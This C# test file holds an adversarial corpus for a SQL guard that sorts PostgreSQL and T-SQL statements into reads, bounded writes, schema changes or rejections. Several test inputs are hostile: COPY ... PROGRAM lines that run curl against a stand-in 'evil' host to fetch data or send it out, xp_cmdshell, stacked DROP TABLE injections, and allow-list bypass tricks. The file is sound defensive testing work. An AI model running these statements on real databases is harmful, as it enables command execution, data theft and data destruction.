namespace Rtfq.Spike;

/// <summary>What the guard must conclude for a statement.</summary>
public enum Verdict
{
    Read,
    Mutation,
    /// <summary>
    /// Additive or corrective schema change. A separate verdict from Mutation on
    /// purpose: the row cap and before-image journaling give it zero coverage, so
    /// it takes a different path with different controls.
    /// </summary>
    Schema,
    Reject
}

/// <param name="Target">
/// Schema-qualified relation the guard must resolve for the write allow-list.
/// Empty when the verdict makes it irrelevant.
/// </param>
/// <param name="Why">What this case probes. Load-bearing: these notes justify the guard's shape.</param>
public record Case(string Name, string Sql, Verdict Want, string Target, string Why);

/// <summary>
/// The adversarial battery. Deliberately identical in content to the Go spike's
/// corpus so the two runtimes are judged on the same evidence.
/// </summary>
public static class Corpus
{
    public static readonly Case[] Pg =
    [
        // --- baseline ----------------------------------------------------
        new("plain-select", "SELECT * FROM orders", Verdict.Read, "public.orders",
            "Baseline read."),
        new("qualified-update", "UPDATE orders SET vip = true WHERE id = 42", Verdict.Mutation, "public.orders",
            "Baseline bounded mutation; target must resolve for the allow-list."),
        new("insert", "INSERT INTO orders (id) VALUES (1)", Verdict.Mutation, "public.orders",
            "INSERT has no WHERE; the qualification rule must not apply."),

        // --- qualification ------------------------------------------------
        new("unqualified-update", "UPDATE orders SET vip = true", Verdict.Reject, "",
            "No WHERE. Rejected outright, no override."),
        new("unqualified-delete", "DELETE FROM orders", Verdict.Reject, "",
            "No WHERE."),
        new("where-1-eq-1", "DELETE FROM orders WHERE 1=1", Verdict.Reject, "",
            "Syntactically qualified, semantically unbounded."),
        new("where-true", "UPDATE orders SET vip = true WHERE true", Verdict.Reject, "",
            "Same trap, literal form."),
        new("where-or-true", "DELETE FROM orders WHERE id = 1 OR true", Verdict.Reject, "",
            "Trivially-true disjunct; needs predicate analysis."),

        // --- statement smuggling -------------------------------------------
        new("stacked", "SELECT 1; DROP TABLE orders", Verdict.Reject, "",
            "Multi-statement input."),
        new("line-comment-decoy", "SELECT 1 -- ; DROP TABLE orders", Verdict.Read, "",
            "DROP is inside a comment; a split-on-semicolon guard fails this."),
        new("block-comment-decoy", "SELECT 1 /* ; DROP TABLE orders */", Verdict.Read, "",
            "Same, block form."),
        new("literal-semicolon", "SELECT * FROM orders WHERE name = 'a; DROP TABLE x'", Verdict.Read, "public.orders",
            "Semicolon inside a string literal."),
        new("empty-statements", "; ; SELECT 1", Verdict.Read, "",
            "Empty statements around a real one."),

        // --- writes wearing a read's clothes --------------------------------
        new("cte-delete", "WITH gone AS (DELETE FROM orders WHERE id = 1 RETURNING *) SELECT * FROM gone", Verdict.Mutation, "public.orders",
            "Top-level node is a SELECT but it mutates."),
        new("cte-update-nested", "WITH a AS (SELECT 1), b AS (UPDATE orders SET vip = true WHERE id = 1 RETURNING id) SELECT * FROM b", Verdict.Mutation, "public.orders",
            "Write buried in the second CTE; the walk must be exhaustive."),
        new("select-into", "SELECT * INTO archived_orders FROM orders", Verdict.Reject, "",
            "PostgreSQL SELECT INTO creates a table: DDL wearing a SELECT node."),

        // --- not DDL, but catastrophic ---------------------------------------
        new("copy-from-program", "COPY orders FROM PROGRAM 'curl http://evil/x.csv'", Verdict.Reject, "",
            "Arbitrary command execution; a DDL deny-list misses it."),
        new("copy-to-program", "COPY (SELECT * FROM orders) TO PROGRAM 'curl -d @- http://evil'", Verdict.Reject, "",
            "Exfiltration channel."),
        new("do-block", "DO $$ BEGIN DELETE FROM orders; END $$", Verdict.Reject, "",
            "Arbitrary PL/pgSQL; the inner DELETE is invisible to classification."),
        new("explain-analyze", "EXPLAIN ANALYZE DELETE FROM orders", Verdict.Reject, "",
            "EXPLAIN ANALYZE actually executes."),
        new("explain-plain", "EXPLAIN SELECT * FROM orders", Verdict.Read, "",
            "Plain EXPLAIN does not execute; must still be allowed."),
        new("grant", "GRANT ALL ON orders TO PUBLIC", Verdict.Reject, "",
            "DCL, so a DDL-only deny-list misses it."),
        new("truncate", "TRUNCATE orders", Verdict.Reject, "",
            "Unbounded delete with no affected-row count to cap."),
        new("create-index", "CREATE INDEX idx ON orders (id)", Verdict.Schema, "public.orders",
            "In scope since the DDL policy changed; see PgDdl for the full battery."),
        new("drop-table", "DROP TABLE orders", Verdict.Reject, "",
            "DDL baseline."),
        new("set-role", "SET ROLE postgres", Verdict.Reject, "",
            "Re-points every subsequent gate at a different identity."),

        // --- identifier resolution --------------------------------------------
        new("schema-qualified", "UPDATE public.orders SET vip = true WHERE id = 1", Verdict.Mutation, "public.orders",
            "Explicit schema resolves to the same target."),
        new("quoted-identifiers", "UPDATE \"public\".\"orders\" SET vip = true WHERE id = 1", Verdict.Mutation, "public.orders",
            "Quoting must not change resolution."),
        new("case-sensitive-quoted", "UPDATE \"Orders\" SET vip = true WHERE id = 1", Verdict.Mutation, "public.Orders",
            "\"Orders\" is a DIFFERENT table from orders; case-folding the check is a bypass."),
        new("homoglyph", "UPDATE оrders SET vip = true WHERE id = 1", Verdict.Mutation, "public.оrders",
            "Leading char is Cyrillic U+043E; must not match an 'orders' allow-list entry."),
        new("other-schema", "UPDATE secret.orders SET vip = true WHERE id = 1", Verdict.Mutation, "secret.orders",
            "Same relation name, different schema."),

        // --- shape of a read ---------------------------------------------------
        new("select-for-update", "SELECT * FROM orders FOR UPDATE", Verdict.Read, "public.orders",
            "A read that takes row locks."),
        new("select-with-limit", "SELECT * FROM orders LIMIT 10", Verdict.Read, "public.orders",
            "Existing LIMIT must be detected so injection does not double it."),
        new("update-subquery", "UPDATE orders SET vip = true WHERE id IN (SELECT id FROM vips)", Verdict.Mutation, "public.orders",
            "Qualified via subquery; the read side is not a second write target."),
        new("merge", "MERGE INTO orders o USING staging s ON o.id = s.id WHEN MATCHED THEN UPDATE SET vip = s.vip", Verdict.Mutation, "public.orders",
            "MERGE is DML that neither UPDATE nor INSERT node types cover."),
    ];

    /// <summary>
    /// DDL battery. The policy is additive and corrective only: change a table so
    /// it holds the right shape of data, never destroy data and never rewrite what
    /// the write allow-list refers to.
    ///
    /// The load-bearing subtlety: ALTER TABLE is ONE statement type covering both
    /// ADD COLUMN and DROP COLUMN, so a statement-type allow-list is not enough
    /// here. The guard must descend into the subcommand.
    /// </summary>
    public static readonly Case[] PgDdl =
    [
        // --- additive / corrective: allowed ---------------------------------
        new("add-column", "ALTER TABLE orders ADD COLUMN email text", Verdict.Schema, "public.orders",
            "The archetypal \"go fix that table\"."),
        new("add-column-default", "ALTER TABLE orders ADD COLUMN tier int NOT NULL DEFAULT 0", Verdict.Schema, "public.orders",
            "Cheap on PG11+; on older engines a full table rewrite under an exclusive lock."),
        new("alter-column-type", "ALTER TABLE orders ALTER COLUMN name TYPE varchar(200)", Verdict.Schema, "public.orders",
            "Corrective widening."),
        new("add-constraint", "ALTER TABLE orders ADD CONSTRAINT chk_total CHECK (total >= 0)", Verdict.Schema, "public.orders",
            "Tightens integrity; additive."),
        new("drop-constraint", "ALTER TABLE orders DROP CONSTRAINT chk_total", Verdict.Schema, "public.orders",
            "Inverse of the above. Destroys no data and is re-appliable."),
        new("set-not-null", "ALTER TABLE orders ALTER COLUMN email SET NOT NULL", Verdict.Schema, "public.orders",
            "Corrective."),
        new("create-index", "CREATE INDEX idx_orders_email ON orders (email)", Verdict.Schema, "public.orders",
            "Explicitly in scope."),
        new("drop-index", "DROP INDEX idx_orders_email", Verdict.Schema, "",
            "Explicitly in scope: an agent must be able to remove an index it added."),

        // --- destroys data: refused ------------------------------------------
        new("drop-column", "ALTER TABLE orders DROP COLUMN email", Verdict.Reject, "",
            "Affects zero ROWS and destroys every value in the column: max_affected_rows offers nothing."),
        new("drop-table", "DROP TABLE orders", Verdict.Reject, "",
            "Destroys everything."),
        new("truncate", "TRUNCATE orders", Verdict.Reject, "",
            "Unbounded delete with no affected-row count to cap."),

        // --- rewrites what the allow-list refers to: refused -------------------
        new("rename-table", "ALTER TABLE orders RENAME TO orders_old", Verdict.Reject, "",
            "Empties the allow-list entry public.orders; a new table created as orders inherits the grant."),
        new("set-schema", "ALTER TABLE orders SET SCHEMA secret", Verdict.Reject, "",
            "Same attack via a different node type."),
        new("rename-column", "ALTER TABLE orders RENAME COLUMN email TO email_old", Verdict.Reject, "",
            "Destroys no data, but silently breaks every caller. Refused as a judgment call, not a safety proof."),

        // --- adjacent things that are not "fixing a table" ---------------------
        new("create-table", "CREATE TABLE audit_notes (id int)", Verdict.Reject, "",
            "Adding a table is a deploy, not a repair; and the new table is on no allow-list."),
        new("create-index-concurrently", "CREATE INDEX CONCURRENTLY idx ON orders (email)", Verdict.Reject, "",
            "Cannot run inside a transaction block, so it cannot use propose/commit at all."),
        new("alter-column-type-using", "ALTER TABLE orders ALTER COLUMN total TYPE int USING left(total, 3)::int", Verdict.Reject, "",
            "The USING clause is an arbitrary transform: silent, unbounded data loss inside a corrective-looking statement."),
    ];

    public static readonly Case[] TSqlDdl =
    [
        new("add-column", "ALTER TABLE orders ADD email nvarchar(200)", Verdict.Schema, "dbo.orders",
            "The archetypal \"go fix that table\"."),
        new("alter-column-type", "ALTER TABLE orders ALTER COLUMN name nvarchar(400)", Verdict.Schema, "dbo.orders",
            "Corrective widening."),
        new("add-constraint", "ALTER TABLE orders ADD CONSTRAINT chk_total CHECK (total >= 0)", Verdict.Schema, "dbo.orders",
            "Additive."),
        new("create-index", "CREATE INDEX ix_orders_email ON orders (email)", Verdict.Schema, "dbo.orders",
            "Explicitly in scope."),
        new("drop-index", "DROP INDEX ix_orders_email ON orders", Verdict.Schema, "dbo.orders",
            "Explicitly in scope."),

        new("drop-column", "ALTER TABLE orders DROP COLUMN email", Verdict.Reject, "",
            "Destroys a column's data while affecting zero rows."),
        new("drop-constraint", "ALTER TABLE orders DROP CONSTRAINT chk_total", Verdict.Schema, "dbo.orders",
            "Same node type as DROP COLUMN in T-SQL: the element kind is what separates them."),
        new("drop-table", "DROP TABLE orders", Verdict.Reject, "",
            "Destroys everything."),
        new("truncate", "TRUNCATE TABLE orders", Verdict.Reject, "",
            "Banned."),
        new("create-table", "CREATE TABLE audit_notes (id int)", Verdict.Reject, "",
            "A deploy, not a repair."),
        new("alter-schema-transfer", "ALTER SCHEMA secret TRANSFER dbo.orders", Verdict.Reject, "",
            "T-SQL's SET SCHEMA: rewrites what the allow-list refers to."),
        new("sp-rename", "EXEC sp_rename 'orders', 'orders_old'", Verdict.Reject, "",
            "Rename via stored procedure - already blocked as EXEC, which is why EXEC stays blocked."),
    ];

    public static readonly Case[] TSql =
    [
        new("plain-select", "SELECT * FROM orders", Verdict.Read, "dbo.orders",
            "Baseline read."),
        new("qualified-update", "UPDATE orders SET vip = 1 WHERE id = 42", Verdict.Mutation, "dbo.orders",
            "Baseline bounded mutation."),
        new("unqualified-update", "UPDATE orders SET vip = 1", Verdict.Reject, "",
            "No WHERE."),
        new("unqualified-delete", "DELETE FROM orders", Verdict.Reject, "",
            "No WHERE."),
        new("where-1-eq-1", "DELETE FROM orders WHERE 1=1", Verdict.Reject, "",
            "Trivially true."),
        new("stacked", "SELECT 1; DROP TABLE orders", Verdict.Reject, "",
            "Multi-statement."),
        new("batch-no-semicolon", "SELECT 1 DROP TABLE orders", Verdict.Reject, "",
            "Valid T-SQL batch: two statements, no separator. Unique to this dialect."),
        new("go-batch", "SELECT 1\nGO\nDROP TABLE orders", Verdict.Reject, "",
            "GO is a client batch separator, not T-SQL."),
        new("exec-dynamic", "EXEC('DELETE FROM orders')", Verdict.Reject, "",
            "Dynamic SQL: payload is a string literal, invisible to the tree."),
        new("sp-executesql", "EXEC sp_executesql N'DELETE FROM orders'", Verdict.Reject, "",
            "Same, via the documented procedure."),
        new("xp-cmdshell", "EXEC xp_cmdshell 'dir'", Verdict.Reject, "",
            "Command execution."),
        new("select-into", "SELECT * INTO archived FROM orders", Verdict.Reject, "",
            "Creates a table."),
        new("cte-delete", "WITH gone AS (SELECT id FROM orders WHERE id = 1) DELETE FROM orders WHERE id IN (SELECT id FROM gone)", Verdict.Mutation, "dbo.orders",
            "CTE followed by a write."),
        new("bracket-identifiers", "UPDATE [dbo].[orders] SET vip = 1 WHERE id = 1", Verdict.Mutation, "dbo.orders",
            "Bracket quoting must resolve identically."),
        new("three-part-name", "UPDATE otherdb.dbo.orders SET vip = 1 WHERE id = 1", Verdict.Mutation, "otherdb.dbo.orders",
            "Cross-database reference; a two-part allow-list cannot express this."),
        new("truncate", "TRUNCATE TABLE orders", Verdict.Reject, "",
            "Banned."),
        new("drop-table", "DROP TABLE orders", Verdict.Reject, "",
            "DDL baseline."),
        new("merge", "MERGE orders AS o USING staging AS s ON o.id = s.id WHEN MATCHED THEN UPDATE SET vip = s.vip;", Verdict.Mutation, "dbo.orders",
            "MERGE, T-SQL form."),
        new("top-update", "UPDATE TOP (5) orders SET vip = 1 WHERE id > 0", Verdict.Mutation, "dbo.orders",
            "UPDATE TOP is bounded by syntax; the cap still governs."),
        new("insert-exec", "INSERT INTO orders EXEC sp_getorders", Verdict.Reject, "",
            "Runs a stored procedure behind an allow-listed INSERT; only the InsertSource reveals it."),
    ];
}
